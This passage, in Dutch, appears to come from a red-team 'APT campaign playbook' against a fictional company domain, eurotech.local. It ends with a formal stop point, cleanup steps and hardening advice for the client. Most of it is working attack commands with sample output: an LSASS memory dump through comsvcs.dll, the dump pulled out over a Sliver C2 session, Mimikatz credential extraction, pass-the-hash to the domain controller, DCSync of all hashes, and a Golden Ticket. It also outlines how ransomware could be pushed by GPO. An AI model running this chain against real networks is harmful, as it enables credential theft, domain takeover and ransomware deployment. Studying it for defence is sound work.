admin.mschmidt is ingelogd. Nu dumpen we LSASS.

```powershell
# We zijn svc_backup (local admin) op YOURBACKUP01
# admin.mschmidt is ook ingelogd (RDP sessie)

# LSASS dump via comsvcs.dll (geen Mimikatz binary)
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\debug.dmp full
```

> **📘 WAAROM COMSVCS.DLL:**
> - Native Windows DLL
> - Geen externe tools
> - Minder signatures dan Mimikatz
> - Detectie nog steeds mogelijk, maar lager risico

```bash
# Exfiltreer dump naar onze C2
# Via Sliver session:
sliver (YOURBACKUP01) > download C:\Windows\Temp\debug.dmp /tmp/

# Analyseer offline met Mimikatz
mimikatz.exe "sekurlsa::minidump /tmp/debug.dmp" "sekurlsa::logonpasswords" "exit"

# Output:
# Authentication Id : 0 ; 3847234 (00000000:003ab123)
# Session           : RemoteInteractive from 3
# User Name         : admin.mschmidt
# Domain            : EUROTECH
# Logon Server      : DC01
#         msv :
#          [00000003] Primary
#          * Username : admin.mschmidt
#          * Domain   : EUROTECH
#          * NTLM     : 8d1c4a2b9e3f7c6d5a8b2e1f4c9d7a3b
#          * SHA1     : ...
```

> **📘 JACKPOT:**
> - admin.mschmidt NTLM hash: **8d1c4a2b9e3f7c6d5a8b2e1f4c9d7a3b**
> - Dit is een Domain Admin account
> - We kunnen nu Pass-the-Hash naar de DC

---

# FASE 6: DOMAIN DOMINANCE

## 6.1 Pass-the-Hash naar Domain Controller

```bash
# Vanaf onze machine (via VPN)
wmiexec.py eurotech.local/admin.mschmidt@10.10.1.10 -hashes :8d1c4a2b9e3f7c6d5a8b2e1f4c9d7a3b

# Output:
# [*] SMBv3.0 dialect used
# [!] Launching semi-interactive shell
# C:\>whoami
# eurotech\admin.mschmidt
# C:\>hostname
# DC01
```

> **📘 WE ZIJN OP DE DOMAIN CONTROLLER:**
> - Met Domain Admin rechten
> - We hebben volledige controle over het domein
> - Alle 2.500 endpoints zijn nu bereikbaar

---

## 6.2 DCSync - Alle Credentials Dumpen

```bash
# DCSync alle domain credentials
secretsdump.py eurotech.local/admin.mschmidt@10.10.1.10 -hashes :8d1c4a2b9e3f7c6d5a8b2e1f4c9d7a3b -just-dc-ntlm

# Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:92f5d3a7c1b8e4f2d6a9c3e5b7d1f8a4:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f1e2d3c4b5a6978675645342312e1f0d:::
# admin.jvries:1104:aad3b435b51404eeaad3b435b51404ee:...:::
# admin.mschmidt:1105:aad3b435b51404eeaad3b435b51404ee:...:::
# ... (2,341 accounts)
```

> **📘 WAT WE NU HEBBEN:**
> - **ALLE** domain account wachtwoord hashes
> - **krbtgt hash:** Kunnen Golden Tickets maken
> - **Administrator hash:** Fallback domain admin
> - **Alle user hashes:** Kunnen iedereen impersonaten

---

## 6.3 Golden Ticket Creatie

```bash
# Golden Ticket = permanente Domain Admin toegang
# Ook als alle wachtwoorden veranderen

# Eerst: krijg Domain SID
lookupsid.py eurotech.local/admin.mschmidt@10.10.1.10 -hashes :8d1c4a2b9e3f7c6d5a8b2e1f4c9d7a3b

# Domain SID: S-1-5-21-3623456789-1234567890-9876543210

# Maak Golden Ticket
ticketer.py -nthash f1e2d3c4b5a6978675645342312e1f0d \
            -domain-sid S-1-5-21-3623456789-1234567890-9876543210 \
            -domain eurotech.local \
            Administrator

# Output: Administrator.ccache (Golden Ticket)
```

> **📘 GOLDEN TICKET BETEKENT:**
> - Geldig voor 10 jaar
> - Werkt zelfs als ALLE wachtwoorden resetten
> - Alleen te invalideren door krbtgt 2x te resetten
> - Wij hebben nu PERMANENTE domain admin toegang

---

# FASE 7: STOP POINT — RANSOMWARE SIMULATION

## 7.1 Waar We Nu Staan

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    HUIDIGE TOEGANGSNIVEAU                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ✓ Domain Admin credentials (admin.mschmidt)                                │
│  ✓ Alle domain account hashes (2,341 accounts)                              │
│  ✓ Golden Ticket (permanente toegang)                                       │
│  ✓ Toegang tot beide Domain Controllers                                     │
│  ✓ Ability om GPO te pushen naar alle 847 computers                         │
│                                                                             │
│  DIT BETEKENT:                                                              │
│  → We kunnen software deployen naar ALLE Windows systemen                   │
│  → We kunnen ransomware deployen via GPO                                    │
│  → We kunnen alle data encrypten                                            │
│  → We kunnen alle backups vernietigen (we hebben backup server toegang)     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 7.2 Bewijs: GPO Deployment Capability

We DEMONSTREREN dat we GPO kunnen pushen, zonder schade aan te richten.

```powershell
# Op DC01 als admin.mschmidt

# Maak test GPO
New-GPO -Name "XPOSE-RedTeam-Test" -Comment "Red Team test - DO NOT DELETE"

# Link aan domein (NIET ACTIVEREN - alleen bewijs)
# We tonen alleen dat we de RECHTEN hebben

Get-GPO -Name "XPOSE-RedTeam-Test"

# Output:
# DisplayName      : XPOSE-RedTeam-Test
# GpoStatus        : AllSettingsEnabled
# CreationTime     : 1/17/2026 14:30:00
# ModificationTime : 1/17/2026 14:30:00
```

> **📘 DIT BEWIJST:**
> We KUNNEN een GPO maken en linken aan het domein.
> 
> **Als dit ransomware was:**
> - GPO zou scheduled task aanmaken op alle computers
> - Scheduled task zou ransomware executable downloaden
> - Bij volgende GPO refresh (90 min default) = ALLE 847 computers encrypted

---

## 7.3 Gesimuleerde Ransomware Impact

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    GESIMULEERDE RANSOMWARE IMPACT                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ALS WIJ RANSOMWARE HADDEN GEDEPLOYED:                                      │
│                                                                             │
│  Scope:                                                                     │
│  • 847 Windows computers encrypted                                          │
│  • 15 Windows servers encrypted (inclusief backup!)                         │
│  • 2.500 gebruikers zonder toegang                                          │
│  • Geschatte downtime: 2-4 weken                                            │
│                                                                             │
│  Financiële impact:                                                         │
│  • Directe kosten: €500K-2M (incident response, recovery)                   │
│  • Productieverlies: €2-5M (2 weken geen operatie)                          │
│  • Reputatieschade: €1-10M (klanten, contracts)                             │
│  • Mogelijke ransom: €5-20M (gebaseerd op omzet €500M)                       │
│  • TOTAAL: €8.5M - €37M                                                     │
│                                                                             │
│  Backup impact:                                                             │
│  • We hadden toegang tot YOURBACKUP01 en YOURBACKUP02                       │
│  • Beide servers zouden encrypted worden                                    │
│  • Recovery zou afhangen van offline/tape backups                           │
│                                                                             │
│  Data exfiltratie (als we dit wilden):                                      │
│  • Volledige AD database (alle credentials)                                 │
│  • SharePoint/OneDrive documenten                                           │
│  • Email archives                                                           │
│  • Financiële data (we hadden Finance toegang via phishing)                 │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 7.4 Formeel STOP Point

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                           STOP POINT DECLARATION                               ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  Datum:  17 januari 2026, 15:00 UTC                                           ║
║  Tester: [XPOSE Red Team]                                                     ║
║                                                                               ║
║  VERKLARING:                                                                  ║
║                                                                               ║
║  Op dit moment verklaren wij dat wij de volgende toegang hebben bereikt:      ║
║                                                                               ║
║  1. Domain Administrator toegang tot eurotech.local                           ║
║  2. Volledige controle over DC01 en DC02                                      ║
║  3. Vermogen om Group Policy te pushen naar alle domain computers             ║
║  4. Toegang tot backup infrastructuur                                         ║
║  5. Alle domain credentials (via DCSync)                                      ║
║  6. Golden Ticket voor persistente toegang                                    ║
║                                                                               ║
║  RANSOMWARE DEPLOYMENT STATUS:                                                ║
║                                                                               ║
║  Wij bevestigen dat op dit moment ransomware gedeployed HAD KUNNEN worden     ║
║  via de volgende methode:                                                     ║
║                                                                               ║
║  1. GPO aanmaken met scheduled task                                           ║
║  2. Scheduled task downloadt ransomware van externe server                    ║
║  3. GPO linken aan domain root                                                ║
║  4. Binnen 90 minuten: alle 847 endpoints encrypted                           ║
║  5. Backup servers apart encrypten (we hebben daar al shell)                  ║
║                                                                               ║
║  WIJ STOPPEN HIER.                                                            ║
║                                                                               ║
║  Geen daadwerkelijke ransomware is gedeployed.                                ║
║  Geen productie systemen zijn verstoord.                                      ║
║  Geen data is geëxfiltreerd.                                                  ║
║                                                                               ║
║  Bewijs van toegang is verzameld via:                                         ║
║  • Screenshots van DC toegang                                                 ║
║  • Test GPO aangemaakt (niet geactiveerd)                                     ║
║  • DCSync output (hashes, niet gekraakt)                                      ║
║  • Golden Ticket (bewaard, niet gebruikt voor verdere acties)                 ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

# FASE 8: CLEANUP & REPORTING

## 8.1 Cleanup Checklist

```
Verwijderen:
☐ Test GPO "XPOSE-RedTeam-Test" van DC
☐ Sliver implant van YOURBACKUP01
☐ LSASS dump files (debug.dmp)
☐ SharpHound output van P.Bakker's Documents
☐ Evilginx2 phishing infrastructure

Communiceren met klant:
☐ Meld dat cleanup compleet is
☐ Vraag verificatie dat wij geen toegang meer hebben
☐ Lever Golden Ticket materials (voor bewijs, daarna vernietigen)
```

## 8.2 Timeline Summary

```
DAG 1-14:    OSINT & Infrastructure setup
DAG 15:      Phishing campagne verzonden
DAG 15:      Peter Bakker credentials captured (09:47)
DAG 15:      VPN toegang verkregen (10:15)
DAG 15:      BloodHound data verzameld (14:00)
DAG 15:      Kerberoasting uitgevoerd (14:30)
DAG 16:      svc_backup wachtwoord gekraakt (offline)
DAG 16:      Lateral movement naar YOURBACKUP01 (10:00)
DAG 17:      admin.mschmidt credentials captured (09:30)
DAG 17:      Domain Controller toegang (09:45)
DAG 17:      DCSync uitgevoerd (10:00)
DAG 17:      STOP POINT DECLARED (15:00)
```

---

# KEY TAKEAWAYS

## Wat Werkte

1. **OSINT → Gerichte Phishing**
   - LinkedIn research identificeerde exacte targets
   - HR Manager ontving "verwachte" email over sollicitatie

2. **Evilginx2 → MFA Bypass**
   - Zelfs met MFA konden we volledig authenticeren
   - Session cookie capture is krachtig

3. **Kerberoasting → Service Account Compromise**
   - Geen admin nodig
   - Zwakke wachtwoorden op service accounts

4. **Geduld → Domain Admin**
   - Wachten op admin login in plaats van forceren
   - Minder detectie risico

## Recommendations voor Klant

```
KRITIEK:
1. Implementeer Phishing-Resistant MFA (FIDO2, hardware keys)
2. Reset svc_backup en alle service account wachtwoorden
3. Reset krbtgt twee keer (invalideer Golden Tickets)
4. Review GPO creation permissions

HOOG:
5. Implementeer credential tiering (admins niet op workstations)
6. Enable Credential Guard op servers
7. Implementeer just-in-time admin access
8. Enhanced monitoring op LSASS access

MEDIUM:
9. User awareness training (phishing)
10. Regular review van service account SPNs
11. Implementeer honeytokens
```

---

**EINDE APT CAMPAIGN PLAYBOOK**

---

*Dit document beschrijft een COMPLETE aanval van begin tot eind.*
*Van OSINT tot "hier hadden we ransomware kunnen droppen".*
*Met expliciet STOP point en impact assessment.*

